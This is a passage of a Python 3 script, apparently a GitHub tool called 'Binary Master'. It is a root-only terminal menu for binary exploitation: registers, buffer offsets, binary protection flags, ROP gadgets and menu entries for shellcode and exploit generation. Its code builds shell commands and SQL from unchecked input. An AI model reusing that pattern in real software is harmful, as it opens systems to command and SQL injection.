#!/usr/bin/python3
# coding:UTF-8

# -------------------------------------------------------------------------------------
#         PYTHON3 SCRIPT FILE FOR THE REMOTE ANALYSIS OF COMPUTER NETWORKS
#         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
# -------------------------------------------------------------------------------------

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Load required imports.
# Modified: N/A
# -------------------------------------------------------------------------------------

import os
import sys
#import time
import os.path
import sqlite3
import pyfiglet
import datetime
import linecache

from termcolor import colored

colour0 = "red"			# DISPLAY COLOURS
colour1 = "grey"
colour2 = "cyan"
colour3 = "blue"
colour4 = "black"
colour5 = "white"
colour6 = "green"
colour7 = "yellow"
colour8 = "magenta"

colourx = colour7

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TRY HARDER                                                             
# Details : Create functional subroutines called from main.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

def cutLine(variable1, variable2):
   command("sed -i '/" + variable1 + "/d' ./" + variable2)
   return
   
def parsFile(variable):
   command("sed -i '/^$/d' ./" + variable)
   return      
      
def lineCount(variable):
   command("cat " + variable + " | wc -m > count1.tmp")
   count = (linecache.getline("count1.tmp", 1).rstrip("\n"))
   if count == 0:
      return int(count)
   else:
      command("cat " + variable + " | wc -l > count2.tmp")
      count = (linecache.getline("count2.tmp", 1).rstrip("\n"))
   return int(count)

def spacePadding(variable,value):
   variable = variable.rstrip("\n")
   variable = variable[:value]
   while len(variable) < value:
      variable += " "
   return variable

def getTime():
   variable = str(datetime.datetime.now().time())
   variable = variable.split(".")
   variable = variable[0]
   variable = variable.split(":")
   variable = variable[0] + ":" + variable[1]
   variable = spacePadding(variable, COL1)
   return variable   
     
def command(variable):
   if bugHunt == 1:
      print(colored(variable, colour5))
   os.system(variable)
   return 
 
def prompt():
   null = input("\nPress ENTER to continue...")
   return   
   
def saveParams():
   command("echo '" + RAX + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + COM + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + RBX + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + RCX + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")   
   command("echo '" + RDX + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + RSI + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + RDI + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + RSP + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + RBP + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + OFF + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")   
   command("echo '" + IND + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + ARC + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + FIL + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")   
   command("echo '" + SRT + "' | base64 --wrap=0 >> base64.tmp"); command("echo '\n' >> base64.tmp")  
   
   parsFile("base64.tmp")
   
   RAX2 = linecache.getline("base64.tmp", 1).rstrip("\n")  
   COM2 = linecache.getline("base64.tmp", 2).rstrip("\n")
   RBX2 = linecache.getline("base64.tmp", 3).rstrip("\n")
   RCX2 = linecache.getline("base64.tmp", 4).rstrip("\n")
   RDX2 = linecache.getline("base64.tmp", 5).rstrip("\n")
   RSI2 = linecache.getline("base64.tmp", 6).rstrip("\n")
   RDI2 = linecache.getline("base64.tmp", 7).rstrip("\n")
   RSP2 = linecache.getline("base64.tmp", 8).rstrip("\n")
   RBP2 = linecache.getline("base64.tmp", 9).rstrip("\n")
   OFF2 = linecache.getline("base64.tmp", 10).rstrip("\n")
   IND2 = linecache.getline("base64.tmp", 11).rstrip("\n")
   ARC2 = linecache.getline("base64.tmp", 12).rstrip("\n")
   FIL2 = linecache.getline("base64.tmp", 13).rstrip("\n")
   SRT2 = linecache.getline("base64.tmp", 14).rstrip("\n")    
     
   cursor.execute("UPDATE REMOTETARGET SET OSF = \"" + RAX2 + "\" WHERE IDS = 2"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET COM = \"" + COM2 + "\" WHERE IDS = 2"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET DNS = \"" + RBX2 + "\" WHERE IDS = 2"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET TIP = \"" + RCX2 + "\" WHERE IDS = 2"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET PTS = \"" + RDX2 + "\" WHERE IDS = 2"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET WEB = \"" + RSI2 + "\" WHERE IDS = 2"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET USR = \"" + RDI2 + "\" WHERE IDS = 2"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET PAS = \"" + RSP2 + "\" WHERE IDS = 2"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET NTM = \"" + RBP2 + "\" WHERE IDS = 2"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET TGT = \"" + OFF2 + "\" WHERE IDS = 2"); connection.commit()	
   cursor.execute("UPDATE REMOTETARGET SET DOM = \"" + IND2 + "\" WHERE IDS = 2"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET SID = \"" + ARC2 + "\" WHERE IDS = 2"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET FIL = \"" + FIL2 + "\" WHERE IDS = 2"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET TSH = \"" + SRT2 + "\" WHERE IDS = 2"); connection.commit()
   return     
   
def catsFile(variable):
   count = lineCount(variable)
   if count > 0:
      command("echo '" + Green + "'")
      command("cat " + variable)
      command("echo '" + Reset + "'")
   return   
        
def dispBanner(variable,flash):
   ascii_banner = pyfiglet.figlet_format(variable).upper()
   ascii_banner = ascii_banner.rstrip("\n")
   if flash == 1:
      command("clear")
      print(colored(ascii_banner,colour0, attrs=['bold']))
   command("pyfiglet " + variable + " > banner.tmp")
   return
   
def clearClutter():
   command("rm *.tmp")
   linecache.clearcache()
   return

def dispMenu():
   print('\u2554' + ('\u2550')*15 + '\u2566' + ('\u2550')*41 + '\u2566' + ('\u2550')*47 + '\u2566' + ('\u2550')*58 + '\u2557')
   print('\u2551' + " TIME   ", end =' ')
   print(colored(LTM[:5],colour6), end=' ')
   print('\u2551' + " " + colored("FILENAME",colour5), end=' ')   
   if COM[:7] == "UNKNOWN":
      print(colored(FIL.upper(),colour7), end=' ')
   else:
      print(colored(FIL.upper(),colour6), end=' ')      
   print(colored(MODE,colour3) + '\u2551' + " " + colored("OFFSET",colour5) + (" ")*14 + colored("FUNCTIONS ",colour5) + colored(funcNum[:7],colour6) + (" ")*9 + '\u2551' + (" ")*1 + colored("OFFSET",colour5) + " "*14 + colored("GADGETS ",colour5) + colored(gadgNum[:7],colour6) + (" ")*22 + '\u2551') 
   print('\u2560' + ('\u2550')*15 + '\u256C' + ('\u2550')*20 + '\u2566' + ('\u2550')*20 + '\u256C' + ('\u2550')*24 + '\u2550' + ('\u2550')*22 + '\u256C' + ('\u2550')*58 + '\u2563')   
   
   print('\u2551' + " RAX/EAX/AX/AH " + '\u2551', end=' ')
   if RAX[:18] == "0x0000000000000000":
      print(colored(RAX[:COL1],colour7), end=' ')
   else:
      print(colored(RAX[:COL1],colour6), end=' ')
   print('\u2551' + " " + colored(RE,colourx) + " " +  '\u2551', end=' ')
   if SRT in ADDR[0]:
      print(colored(ADDR[0],colour3), end=' ')
   else:
      print(colored(ADDR[0],colour6), end=' ')   
   print('\u2551', end=' ')   
   print(colored(GADD[0],colour6), end=' ')
   print('\u2551')      
   
   print('\u2551' + " RBX/EBX/BX/BH " + '\u2551', end=' ')
   if RBX[:18] == "0x0000000000000000":
      print(colored(RBX[:COL1],colour7), end=' ')
   else:
      print(colored(RBX[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if "No Canary" in ST:
      print(colored(ST,'blue'), end=' ')
   else:
      print(colored(ST ,colourx), end=' ')   
   print('\u2551', end=' ')
   if SRT.rstrip(" ") in ADDR[1]:
      print(colored(ADDR[1],colour3), end=' ')
   else:
      print(colored(ADDR[1],colour6), end=' ')   
   print('\u2551', end=' ')   
   print(colored(GADD[1],colour6), end=' ')
   print('\u2551')   
  
   print('\u2551' + " RCX/ECX/CX/CH " + '\u2551', end=' ')
   if RCX[:18] == "0x0000000000000000":
      print(colored(RCX[:COL1],colour7), end=' ')
   else:
      print(colored(RCX[:COL1],colour6), end=' ')
   print('\u2551' + " " + colored(FO,colourx) + " " +  '\u2551', end=' ')
   if SRT.rstrip(" ") in ADDR[2]:
      print(colored(ADDR[2],colour3), end=' ')
   else:
      print(colored(ADDR[2],colour6), end=' ')   
   print('\u2551', end=' ')   
   print(colored(GADD[2],colour6), end=' ')
   print('\u2551')   
  
   print('\u2551' + " RDX/EDX/DX/DH " + '\u2551', end=' ')
   if RDX[:18] == "0x0000000000000000":
      print(colored(RDX,colour7), end=' ')
   else:
      print(colored(RDX,colour6), end=' ')
   print('\u2551' + " " + colored(NX,colourx) + " " +  '\u2551', end=' ')
   if SRT.rstrip(" ") in ADDR[3]:
      print(colored(ADDR[3],colour3), end=' ')
   else:
      print(colored(ADDR[3],colour6), end=' ')   
   print('\u2551', end=' ')   
   print(colored(GADD[3],colour6), end=' ')
   print('\u2551')   
  
   print('\u2551' + " RSI/ESI/SI/SL " + '\u2551', end=' ')
   if RSI[:18] == "0x0000000000000000":
      print(colored(RSI[:COL1],colour7), end=' ')
   else:
      print(colored(RSI[:COL1],colour6), end=' ')
   print('\u2551' + " " + colored(PI,colourx) + " " +  '\u2551', end=' ')
   if SRT.rstrip(" ") in ADDR[4]:
      print(colored(ADDR[4],colour3), end=' ')
   else:
      print(colored(ADDR[4],colour6), end=' ')   
   print('\u2551', end=' ')   
   print(colored(GADD[4],colour6), end=' ')
   print('\u2551')   
   
   print('\u2551' + " RDI/EDI/DI/DL " + '\u2551', end=' ')
   if RDI[:18] == "0x0000000000000000":
      print(colored(RDI,colour7), end=' ')
   else:
      print(colored(RDI,colour6), end=' ')
   print('\u2551' + " " + colored(RW,colourx) + " " +  '\u2551', end=' ')
   if SRT.rstrip(" ") in ADDR[5]:
      print(colored(ADDR[5],colour3), end=' ')
   else:
      print(colored(ADDR[5],colour6), end=' ')   
   print('\u2551', end=' ')
   print(colored(GADD[5],colour6), end=' ')
   print('\u2551')        
   
   #----
   print('\u2551', end= ' ')
   print(colored("RSP/ESP/SP/SL",colour2),end=' ')
   print('\u2551', end=' ')   
   if RSP[:18] == "0x0000000000000000":
      print(colored(RSP,colour7), end=' ')
   else:
      print(colored(RSP,colour6), end=' ')   
   print( '\u2551', end=' ')   
   if OFF[:1] == "0":
      print(colored("OFFSET  " + OFF[:10],colour7,attrs=['bold']), end=' ')
      print('\u2551', end=' ')
   else:
      print(colored("OFFSET  " + OFF[:10],colour7,attrs=['bold']), end=' ')
      print('\u2551', end=' ')            
   if SRT.rstrip(" ") in ADDR[6]:
      print(colored(ADDR[6],colour3), end=' ')
   else:
      print(colored(ADDR[6],colour6), end=' ')   
   print('\u2551', end=' ')   
   print(colored(GADD[6],colour6), end=' ')
   print('\u2551')   
   
   # ----
   print('\u2551', end=' ')
   print(colored("RBP/EBP/BP/BL",colour2), end=' ')
   print('\u2551', end=' ')   
   if RBP[:18] == "0x0000000000000000":
      print(colored(RBP,colour7), end=' ')
   else:
      print(colored(RBP,colour6), end=' ')
      
   print('\u2551',end=' ')
   if ARC[:6] == "64 Bit":
      print(colored("        -8 Bytes  ",colour7,attrs=['bold']), end=' ')
   if ARC[:6] == "32 Bit":
      print(colored("        -4 Bytes  ",colour7,attrs=['bold']), end=' ')
   if ARC[:1] == "E":
      print(colored("                  ",colour7,attrs=['bold']), end=' ')   

   print('\u2551', end=' ')
   
   if SRT.rstrip(" ") in ADDR[7]:
      print(colored(ADDR[7],colour3), end=' ')
   else:
      print(colored(ADDR[7],colour6), end=' ')   
   print('\u2551', end=' ')   
   print(colored(GADD[7],colour6), end=' ')
   print('\u2551')   
  
   #----
   print('\u2551', end=' ')
   if ARC[:1] != "0" and OFF[:1] != "0":
      print(colored("RIP/EIP     *", colour7,attrs=['bold']), end=' ')
   else:
      print(colored("RIP/EIP      ", colour7,attrs=['bold']), end=' ')   
   print( '\u2551', end=' ')
   if INS[:18] == "0x0000000000000000":
      print(colored(INS,colour7), end=' ')
   else:
      print(colored(INS,colour6), end=' ')         
   print('\u2551', end=' ')
   
   if ARC[:6] == "64 Bit":
      print(colored("        +8 Bytes  ",colour7,attrs=['bold']), end=' ')
   if ARC[:6] == "32 Bit":
      print(colored("        +4 Bytes  ",colour7,attrs=['bold']), end=' ')
   if ARC[:1] == "E":
      print(colored("                  ",colour7,attrs=['bold']), end=' ')   
   
   print('\u2551', end=' ')   
   if SRT.rstrip(" ") in ADDR[8]:
      print(colored(ADDR[8],colour3), end=' ')
   else:
      print(colored(ADDR[8],colour6), end=' ')      
   print('\u2551', end=' ')   
   print(colored(GADD[8],colour6), end=' ')
   print('\u2551')   
 
   print('\u2551' + " START ADDRESS " + '\u2551', end=' ')
   if SRT[:18] == "0x0000000000000000":
      print(colored(SRT,colour7), end=' ')
   else:
      print(colored(SRT,colour6), end=' ')
   print('\u2551' + " " + " "*COL1 + " " +  '\u2551', end=' ')
   if SRT.rstrip(" ") in ADDR[9]:
      print(colored(ADDR[9],colour3), end=' ')
   else:
      print(colored(ADDR[9],colour6), end=' ')      
   print('\u2551', end=' ')   
   print(colored(GADD[9],colour6), end=' ')
   print('\u2551')   

   print('\u2551' + " FILE   FORMAT " + '\u2551', end=' ')
   if COM[:5] == "EMPTY":
      print(colored(COM,colour7), end=' ')
   else:
      print(colored(COM,colour6), end=' ')
   print('\u2551' + " " + " "*COL1 + " " +  '\u2551', end=' ')
   if SRT.rstrip(" ") in ADDR[10]:
      print(colored(ADDR[10],colour3), end=' ')
   else:
      print(colored(ADDR[10],colour6), end=' ')   
   print('\u2551', end=' ')   
   print(colored(GADD[10],colour6), end=' ')
   print('\u2551')    

   print('\u2551' + " ARCHITECTURE  " + '\u2551', end=' ')
   if ARC[:5] == "EMPTY":
      print(colored(ARC,colour7), end=' ')
   else:
      print(colored(ARC,colour6), end=' ')
   print('\u2551' + " " + " "*COL1 + " " +  '\u2551', end=' ')
   if SRT.rstrip(" ") in ADDR[11]:
      print(colored(ADDR[11],colour3), end=' ')
   else:
      print(colored(ADDR[11],colour6), end=' ')   
   print('\u2551', end=' ')   
   print(colored(GADD[11],colour6), end=' ')
   print('\u2551')    
   
   print('\u2551' + " INDIAN   TYPE " + '\u2551', end=' ')     
   if IND[:5] == "EMPTY":
      print(colored(IND,colour7), end=' ')
   else:
      print(colored(IND,colour6), end=' ')
   print('\u2551' + " " + " "*COL1 + " " +  '\u2551', end=' ')   
   if SRT.rstrip(" ") in ADDR[12]:
      print(colored(ADDR[12],colour3), end=' ')
   else:
      if ADDR[13] != "":
         print(colored(ADDR[12],colour0), end=' ')   
      else:
         print(colored(ADDR[12],colour6), end=' ')
   print('\u2551', end=' ')   
 
   print(colored(GADD[12],colour6), end=' ')
   print('\u2551')      
   print('\u2560' + ('\u2550')*15 + '\u2569' + ('\u2550')*20 + '\u2569' + ('\u2550')*20 + '\u2569' + ('\u2550')*24 + '\u2550' + ('\u2550')*22 + '\u2563', end=' '); print(colored(GADD[13],colour6), end=' '); print('\u2551')
   return
   
def options():
   print('\u2551' + "(01) Set  ACCUMULATOR (11) Set FILE  FORMAT (21) Read File Head (31) Pattern   Creater (41) HEX Editor   " + '\u2551', end=' '); print(colored(GADD[14],colour6), end=' '); print('\u2551')
   print('\u2551' + "(02) Set BASE POINTER (12) Set ARCHITECTURE (22) Read   Objects (32) Initiate  Program (42) GHIDRA       " + '\u2551', end=' '); print(colored(GADD[15],colour6), end=' '); print('\u2551')
   print('\u2551' + "(03) Set LOOP COUNTER (13) Set INDIAN  Type (23) Read   Section (33) G.D.B.  Interface (43) ImmunityDeBug" + '\u2551', end=' '); print(colored(GADD[16],colour6), end=' '); print('\u2551')  
   print('\u2551' + "(04) Set DATALOCATION (14) Select  FILENAME (24) Read   Headers (34) Find SegmentFault (44) NASM Shell   " + '\u2551', end=' '); print(colored(GADD[17],colour6), end=' '); print('\u2551')
   print('\u2551' + "(05) Set SOURCE INDEX (15) Use Static  Mode (25) Read   Execute (35) Set BUFFER OFFSET (45) Gen ShellCode" + '\u2551', end=' '); print(colored(GADD[18],colour6), end=' '); print('\u2551')
   print('\u2551' + "(06) Set DESTIN INDEX (16) Use Dynamic Mode (26) Read DeBugInfo (36) Dis-Assemble MAIN (46) Gen ExploCode" + '\u2551', end=' '); print(colored(GADD[19],colour6), end=' '); print('\u2551')
   print('\u2551' + "(07) Set STACKPOINTER (17) Examine  Program (27) Read   Intamix (37) Dis-Assemble ADDR (47)              " + '\u2551', end=' '); print(colored(GADD[20],colour6), end=' '); print('\u2551')
   print('\u2551' + "(08) Set BASE POINTER (18) CheckSec Program (28) Read   Symbols (38) Dis-Assemble FUNC (48)              " + '\u2551', end=' '); print(colored(GADD[21],colour6), end=' '); print('\u2551')
   print('\u2551' + "(09) Set INST POINTER (19) List   Functions (29) Read Stab Data (39)                   (59) Reset        " + '\u2551', end=' '); print(colored(GADD[22],colour6), end=' '); print('\u2551')
   print('\u2551' + "(10) Set STARTADDRESS (20) List All Gadgets (30) Read HexFormat (40)                   (60) Exit         " + '\u2551', end=' ')
   if GADD[24] != "":
      print(colored(GADD[23],colour0), end=' '); print('\u2551')   
   else:
      print(colored(GADD[23],colour6), end=' '); print('\u2551')
   print('\u255A' + ('\u2550')*105 + '\u2569' +  ('\u2550')*58 + '\u255D') #colored("VALUE",colour5)
   return

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TRY HARDER                                                             
# Details : START OF MAIN - Check running as root.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if os.geteuid() != 0:
   print("\n[*] Please run this python3 script as root...")
   exit(1)
else:
   bugHunt = 0  
   proxyChains = 0
   menuName = "ProxyChains"
    
# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TRY HARDER                                                             
# Details : Create local user-friendly variables.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

#netWork = "tun0"						# LOCAL INTERFACE
maxDisp = 25							# UNLIMITED VALUE

Yellow  = '\e[1;93m'						# OP SYSTEM COLOUR
Green   = '\e[0;32m'
Reset   = '\e[0m'
Red     = '\e[1;91m'

localDir = "BINMASTER"						# LOCAL DIRECTORYS
      
# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Display program banner and boot system.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

command("xdotool key Alt+Shift+S; xdotool type 'TRY HARDER'; xdotool key Return")
dispBanner("BINARY MASTER",1)
print(colored("\t\tM A S T E R  C R A F T S M A N  E D I T I O N",colour7,attrs=['bold']))
print(colored("\n\n[*] Booting, please wait...", colour3))


# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TRY HARDER                                                             
# Details : Initialise program files and variables.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if not os.path.exists(localDir):
   command("mkdir " + localDir)
   if not os.path.exists("RA.db"):
      print("[-] Missing required file, locate RA.db first...")
      exit(1)
   else:
      command("mv RA.db ./" + localDir + "/RA.db")
else:
   print("[+] Directory " + localDir + " already exists...")

if not os.path.exists(localDir + "/RA.db"):
   print(colored("[!] WARNING!!! - RA.db missing, unable to connect to database...", colour0))
   exit(1)
else:
   connection = sqlite3.connect(localDir + "/RA.db")
   cursor = connection.cursor()
                  
print("[+] Populating system variables...")

SKEW = 0                                # TIME-SKEW SWITCH
COL0 = 17+12				# MAX LEN COMPUTER NAME
COL1 = 18                               # 0x0000000000000000
COL2 = 45                               # MAX LEN ADDRE NAMEz
COL3 = 23+33                            # MAX LEN GADD NAME

ADDR = [" "*COL2]*maxDisp		# ADDRESS VALUES
GADD = [" "*COL3]*maxDisp		# ADDRESS NAMES

RE = spacePadding("RELRO   Unknown", COL1)
ST = spacePadding("STACK   Unknown", COL1)
FO = spacePadding("FORTIFY Unknown", COL1)
NX = spacePadding("NX      Unknown", COL1)
PI = spacePadding("PIE     Unknown", COL1)
RW = spacePadding("RWX     Unknown", COL1)

funcNum = spacePadding(" ",7)
gadgNum = spacePadding(" ",7)

MODE = " "

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TRY HARDER                                                             
# Details : Check the database for stored variables.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

print("[+] Configuration database found - restoring saved data....")
col = cursor.execute("SELECT * FROM REMOTETARGET WHERE IDS = 2").fetchone()
command("echo " + col[1]  + " | base64 -d >  ascii.tmp")
command("echo " + col[2]  + " | base64 -d >> ascii.tmp")
command("echo " + col[3]  + " | base64 -d >> ascii.tmp")
command("echo " + col[4]  + " | base64 -d >> ascii.tmp")
command("echo " + col[5]  + " | base64 -d >> ascii.tmp")
command("echo " + col[6]  + " | base64 -d >> ascii.tmp")
command("echo " + col[7]  + " | base64 -d >> ascii.tmp")
command("echo " + col[8]  + " | base64 -d >> ascii.tmp")
command("echo " + col[9]  + " | base64 -d >> ascii.tmp")
command("echo " + col[10] + " | base64 -d >> ascii.tmp")
command("echo " + col[11] + " | base64 -d >> ascii.tmp")
command("echo " + col[12] + " | base64 -d >> ascii.tmp")
command("echo " + col[13] + " | base64 -d >> ascii.tmp")
command("echo " + col[14] + " | base64 -d >> ascii.tmp")

RAX = linecache.getline("ascii.tmp", 1).rstrip("\n")
COM = linecache.getline("ascii.tmp", 2).rstrip("\n")
RBX = linecache.getline("ascii.tmp", 3).rstrip("\n")
RCX = linecache.getline("ascii.tmp", 4).rstrip("\n")
RDX = linecache.getline("ascii.tmp", 5).rstrip("\n")
RSI = linecache.getline("ascii.tmp", 6).rstrip("\n")
RDI = linecache.getline("ascii.tmp", 7).rstrip("\n")
RSP = linecache.getline("ascii.tmp", 8).rstrip("\n")
RBP = linecache.getline("ascii.tmp", 9).rstrip("\n")
OFF = linecache.getline("ascii.tmp", 10).rstrip("\n")
IND = linecache.getline("ascii.tmp", 11).rstrip("\n")
ARC = linecache.getline("ascii.tmp", 12).rstrip("\n")
FIL = linecache.getline("ascii.tmp", 13).rstrip("\n")
SRT = linecache.getline("ascii.tmp", 14).rstrip("\n")
INS = "0x0000000000000000"

RAX = spacePadding(RAX, COL1)
COM = spacePadding(COM, COL1)
RBX = spacePadding(RBX, COL1)
RCX = spacePadding(RCX, COL1)
RDX = spacePadding(RDX, COL1)
RSI = spacePadding(RSI, COL1)
RDI = spacePadding(RDI, COL1)
RSP = spacePadding(RSP, COL1)
RBP = spacePadding(RBP, COL1)
OFF = spacePadding(OFF, COL1)
IND = spacePadding(IND, COL1)
ARC = spacePadding(ARC, COL1)
FIL = spacePadding(FIL, COL0)
SRT = spacePadding(SRT, COL1)
INS = spacePadding(INS, COL1)
   
# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TRY HARDER                                                             
# Details : Start the main menu controller.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

while True: 
   saveParams()
   clearClutter()
   checkParams = 0							# RESET'S VALUE
   LTM = getTime()							# GET CLOCKTIME
   command("clear")							# CLEARS SCREEN
   dispMenu()								# DISPLAY UPPER
   options()								# DISPLAY LOWER
   selection=input("[?] Please select an option: ")			# SELECT CHOICE

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Secret option that ...
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='0':
      pass
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - RAX VALUE
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='1':
      BAK = RAX
      RAX = input("[?] Please enter accumulator value: ")
      if RAX != "":
         RAX = spacePadding(RAX,COL1)
      else:
            RAX = BAK
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - RBX VALUE
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='2':
      BAK = RBX
      RBX = input("[?] Please enter base value: ")
      if RBX != "":
         RBX = spacePadding(RBX,COL1)
      else:
            RBX = BAK
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - RCX VALUE
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='3':
      BAK = RCX
      RCX = input("[?] Please enter counter value: ")
      if RCX != "":
         RCX = spacePadding(RCX,COL1)
      else:
            RCX = BAK
      prompt()
      
 # ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - RDX VALUE
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='4':
      BAK = RDX
      RDX = input("[?] Please enter data value: ")
      if RDX != "":
         RDX = spacePadding(RDX,COL1)
      else:
            RDX = BAK
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - RSI VALUE
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='5':
      BAK = RSI
      RSI = input("[?] Please enter source value: ")
      if RSI != "":
         RSI = spacePadding(RSI,COL1)
      else:
            RSI = BAK
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - RDI VALUE
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='6':
      BAK = RDI
      RDI = input("[?] Please enter destination value: ")
      if RDI != "":
         RDI = spacePadding(RDI,COL1)
      else:
            RDI = BAK
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - RSP VALUE
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='7':
      BAK = RSP
      RSP = input("[?] Please enter stack pointer value: ")
      if RSP != "":
         RSP = spacePadding(RSP,COL1)
      else:
            RSP = BAK
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - RBP VALUE 
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='8':
      BAK = RBP
      RBP = input("[?] Please enter base pointer value: ")
      if RBP != "":
         RBP = spacePadding(RBP,COL1)
      else:
            RBP = BAK
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Instruction Pointer.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='9':
      BAK = INS
      INS = input("[?] Please enter extended instruction pointer value: ")
      if INS != "":
         INS = spacePadding(INS,COL1)
      else:
            INS = BAK
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Start value
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='10':
      BAK = SRT
      SRT = input("[?] Please enter start value: ")
      if SRT != "":
         SRT = spacePadding(SRT,COL1)
      else:
            SRT = BAK
      prompt()   
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - File format. 
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='11':
      BAK = COM
      COM = input("[?] Please enter file format: ")
      if COM != "":
         COM = spacePadding(COM,COL1)
      else:
            COM = BAK
      prompt()        
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Architecture
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='12':
      BAK = ARC
      ARC = input("[?] Please enter file architecture: ")
      if ARC != "":
         ARC = spacePadding(ARC,COL1)
      else:
            ARC = BAK
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TRY HARDER                                                             
# Details : Menu option selected - Indian value.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
